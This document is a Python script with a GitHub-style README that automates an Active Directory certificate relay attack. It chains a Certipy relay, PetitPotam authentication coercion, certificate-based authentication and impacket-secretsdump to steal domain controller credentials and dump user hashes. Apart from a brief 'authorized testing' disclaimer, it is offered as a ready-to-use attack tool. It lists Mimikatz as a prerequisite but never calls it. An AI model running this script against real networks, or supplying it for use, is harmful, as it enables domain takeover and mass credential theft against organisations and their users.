## Certificate Exploitation Automation Script

Below is a Python script that automates the process of certificate exploitation using tools like Certipy, PetitPotam, and Mimikatz. This script is designed to run on a system with these tools installed and properly configured.

```python
import os
import subprocess
import getpass

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode('utf-8'), stderr.decode('utf-8')

def setup_certipy_relay(dc_ip, ca_server):
    command = f"certipy relay -dc-ip {dc_ip} -ca {ca_server}"
    return run_command(command)

def coerce_authentication(listener_ip, target_ip, username, password):
    command = f"python3 PetitPotam.py -u {username} -p {password} {listener_ip} {target_ip}"
    return run_command(command)

def acquire_certificate(username, domain, dc_ip, certificate_path):
    command = f"certipy auth -username {username} -domain {domain} -dc-ip {dc_ip} -pfx {certificate_path}"
    return run_command(command)

def dump_user_hashes(domain, username, target_ip, hash):
    command = f"impacket-secretsdump {domain}/{username}@{target_ip} -hashes {hash}"
    return run_command(command)

def main():
    dc_ip = input("Enter the Domain Controller IP: ")
    ca_server = input("Enter the CA Server Name: ")
    listener_ip = input("Enter the Listener IP: ")
    target_ip = input("Enter the Target IP: ")
    username = input("Enter the Username: ")
    password = getpass.getpass("Enter the Password: ")
    domain = input("Enter the Domain: ")
    certificate_path = input("Enter the Path to Certificate: ")
    hash = input("Enter the Hash: ")

    print("Setting up Certipy Relay...")
    setup_output, setup_error = setup_certipy_relay(dc_ip, ca_server)
    print("Output:", setup_output)
    print("Error:", setup_error)

    print("Coercing Authentication with PetitPotam...")
    auth_output, auth_error = coerce_authentication(listener_ip, target_ip, username, password)
    print("Output:", auth_output)
    print("Error:", auth_error)

    print("Acquiring Certificate...")
    cert_output, cert_error = acquire_certificate(username, domain, dc_ip, certificate_path)
    print("Output:", cert_output)
    print("Error:", cert_error)

    print("Dumping User Hashes...")
    dump_output, dump_error = dump_user_hashes(domain, username, target_ip, hash)
    print("Output:", dump_output)
    print("Error:", dump_error)

if __name__ == "__main__":
    main()
```

## README for GitHub

### Certificate Exploitation Automation

This repository contains a Python script to automate the process of exploiting digital certificates using various tools. The script performs tasks such as setting up a relay with Certipy, coercing authentication with PetitPotam, acquiring certificates, and dumping user hashes.

#### Prerequisites

- Python 3.x
- Certipy
- PetitPotam
- Mimikatz
- Impacket

#### Installation

1. **Clone the repository:**
    ```bash
    git clone https://github.com/yourusername/certificate-exploitation-automation.git
    cd certificate-exploitation-automation
    ```

2. **Install required tools:**
    - **Certipy:** [Certipy Installation Guide](https://github.com/ly4k/Certipy)
    - **PetitPotam:** [PetitPotam Installation Guide](https://github.com/topotam/PetitPotam)
    - **Mimikatz:** [Mimikatz Installation Guide](https://github.com/gentilkiwi/mimikatz)
    - **Impacket:** [Impacket Installation Guide](https://github.com/SecureAuthCorp/impacket)

3. **Install Python dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

#### Usage

1. **Run the script:**
    ```bash
    python exploit.py
    ```

2. **Follow the prompts to enter the required information:**
    - Domain Controller IP
    - CA Server Name
    - Listener IP
    - Target IP
    - Username
    - Password
    - Domain
    - Path to Certificate
    - Hash

#### Script Functionality

The script performs the following tasks:
1. **Setup Certipy Relay:**
    - Sets up a relay using Certipy to intercept and relay authentication requests.
2. **Coerce Authentication:**
    - Uses PetitPotam to coerce the domain controller into authenticating against the attacker's server.
3. **Acquire Certificate:**
    - Uses Certipy to obtain the certificate of the domain controller's machine account.
4. **Dump User Hashes:**
    - Utilizes Impacket's secretsdump tool to dump user hashes from the domain controller.

#### Security Warning

This script is intended for educational purposes and authorized penetration testing only. Unauthorized use of this script may be illegal and unethical. Use responsibly.

#### Contribution

Contributions are welcome! Please fork the repository and submit a pull request with your changes.

#### License

This project is licensed under the MIT License. See the LICENSE file for details.

---

By following the instructions provided, you can automate the process of exploiting digital certificates within a network environment for educational or authorized testing purposes.